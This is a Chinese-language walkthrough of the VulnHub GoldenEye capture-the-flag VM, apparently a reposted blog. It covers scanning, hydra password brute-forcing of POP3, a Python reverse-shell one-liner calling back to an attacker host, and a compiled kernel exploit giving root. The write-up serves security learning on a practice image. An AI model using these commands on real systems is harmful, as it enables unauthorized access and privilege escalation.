# vulnhub之GoldenEye的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650746183&idx=1&sn=09d9f6a1380eb3ee5bbd6a9a3618d4e5&chksm=87148c47b0630551dc5abfdb25199cc71d12ae5354f6153d87da4af168c879cbdb9c3c73c4ca&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650746183&idx=1&sn=09d9f6a1380eb3ee5bbd6a9a3618d4e5&chksm=87148c47b0630551dc5abfdb25199cc71d12ae5354f6153d87da4af168c879cbdb9c3c73c4ca&scene=27#wechat_redirect)

本周末实践的是vulnhub的GoldenEye镜像，下载地址，https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova，

这个渗透测试镜像也很有趣，一步一个线索，

先来个地址扫描，sudo netdiscover -r 192.168.137.0/24，

![](../Images/ded2a9d8411ea9f3cb4e7e2471716501.png)

接着做端口扫描，sudo nmap -sS -sV -T5 -A -p- 192.168.137.47，

![](../Images/668c0651b5bc112c7dd7dfec9da9e4ea.png)

先访问一下http，http://192.168.137.47/，告诉你了一个路径线索，

![](../Images/b315ce7d85171678ea44ab80d3d7e0b7.png)

那就接着访问这个路径，发现要用户名密码，

![](../Images/452e249a8e39385476eb00e4c9b4c380.png)

再回到根页面，查看源码，告诉你了个脚本文件线索，

![](../Images/e80432def716a4f225ea3251e1de777b.png)

那就继续访问这个脚本文件，这回告诉你了个账号线索，

![](../Images/f41e2f2795debc98937f5bbcb53c1ba1.png)

密码是html编码的，随便找个解密网站搞一下，

![](../Images/099433eee38db9c9182399f6b948a4fd.png)

这就得到了一对账号密码：boris/InvincibleHack3r，登录试试，

![](../Images/37def432508d42dde7a6d7f7c74dd64a.png)

还是得查看源码，

![](../Images/09fad67a60a70e550c28f775a768cbb9.png)

别以为这个没啥用，其实有用，在提示另一个账号，没这个还真走不下去，

到这儿http这条线就先断了，接着走另外一条线，端口扫描不是扫出来两个不知道是啥服务的端口么，进一步详查一下，

sudo nmap -Pn -p 55006,55007 -sV 192.168.137.47，

![](../Images/934eccf700449aa83ea74d3afcc3839d.png)

得知是pop3，那可以继续找能登录的账户，

现在手里有个boris/InvincibleHack3r，登录一下，

sudo nc 192.168.137.47 55007，发现认证不过去，

![](../Images/058c9a5b7747d6fcc20d1fdef985f46f.png)

那就说明登录pop3的密码是另外的，暴破它，sudo hydra -L user.txt -P /usr/share/wordlists/fasttrack.txt 192.168.137.47 -s 55007 pop3，

![](../Images/f2d37db35c803cfc55904f55530f4ca6.png)

拿到了账号密码：boris/secret1!，就可以登录pop3试试了，

![](../Images/36bfdf09cb5b3102b702159c954ff131.png)

啥有用线索也没拿到，这时候想到http那条线最后提示的账号natalya，继续暴破，sudo hydra -L user.txt -P /usr/share/wordlists/fasttrack.txt 192.168.137.47 -s 55007 pop3，

![](../Images/bbfd1d77d3fca96136f55b7fde659d28.png)

拿到了账号密码：natalya/bird，再登录pop3，

![](../Images/24318a075768ac34b48a802ab066061f.png)

这回拿到了另外一个账户线索，并给了登录站点，

按照提示，在本地hosts文件里加上域名地址记录，访问站点，

![](../Images/cb43e852e487e9a319f87e061217daed.png)

继续找线索，看到有一个未读消息，里面又提示了一个账号doak，

![](../Images/b864ace1db3d4aaa52087954a27ae0f9.png)

继续暴破，sudo hydra -L user.txt -P /usr/share/wordlists/fasttrack.txt 192.168.137.47 -s 55007 pop3，

![](../Images/c100262bcc179a646cdffca3f0c975c5.png)

拿到了账号密码：doak/goat，再登录pop3，

![](../Images/30175b64ce74f7012625d87a15a4d65a.png)

哈哈，又提示了一个账户线索，dr\_doak/4England!，登录站点，

![](../Images/346dd6ffa571738c4b9eb30f982cf67d.png)

发现了一个文本文件，

![](../Images/f0c9abde23a2c651faf5191969c6ce6a.png)

下载下来看看内容，

![](../Images/4c0ae1f916e94c81f38b54044c817238.png)

根据提示admin的密码藏在一张照片里，打开看看，

![](../Images/33a57023a0f345013d7cf21fa900d1a0.png)

没啥有用的信息，那就下载下来看看属性，

![](../Images/9a9a308c8b3b4e631ad58c3ead4f101a.png)

拿到了意思base64编码过的密码，随便找个解密网站搞一下，

![](../Images/53be146032f0d583a3c0c0f5d794df9d.png)

这就拿到了账号密码：admin/xWinter1995x!，登录进站点，

![](../Images/a7e2f956b461a40482c18f5f96ad6f81.png)

接下来就是想办法反弹shell出来了，首先写一段脚本，

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.137.45",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'

把脚本放到这里，

![](../Images/0743e1bef3eb5fe189754cbbb92611b5.png)

然后要改环境配置，

![](../Images/3d8b4685b837f36c93330306303ac53c.png)

在外面开个监听，nc -lnvp 4444，然后在这里触发，

![](../Images/07aeb9f6123f354afdad16aab78909dc.png)

shell就过来了，id看一下不是root，需要提权，

![](../Images/0e3fc2018d2e9f76682e12b9665c6887.png)

看一下内核版本，然后搜一下这个内核版本有没有提权方法，

![](../Images/bb542823a2b3fd12ca1e8ad49560fc43.png)

有一个c文件可用，

拷贝到本地，cp /usr/share/exploitdb/exploits/linux/local/37292.c ./

在靶机里确认一下编译环境的支持，不支持gcc，

![](../Images/ae3ae85efc975c35e2a49c21a656e73e.png)

那就得把c文件里编译命令改一下，vim 37292.c，

![](../Images/383ea1a713a748eb06a474c079b6c342.png)

然后开个http文件下载服务，python -m SimpleHTTPServer，

在靶机里下载这个c文件，

![](../Images/5e1699fb2479118ba1950314d6349ce7.png)

编译可执行文件，cc 37292.c -o exp，

![](../Images/5c19d6fdd7d3372fb15af988f0ce56eb.png)

执行，拿到root权限，

![](../Images/4f79ada1ff2d16d623259b63b53baa72.png)
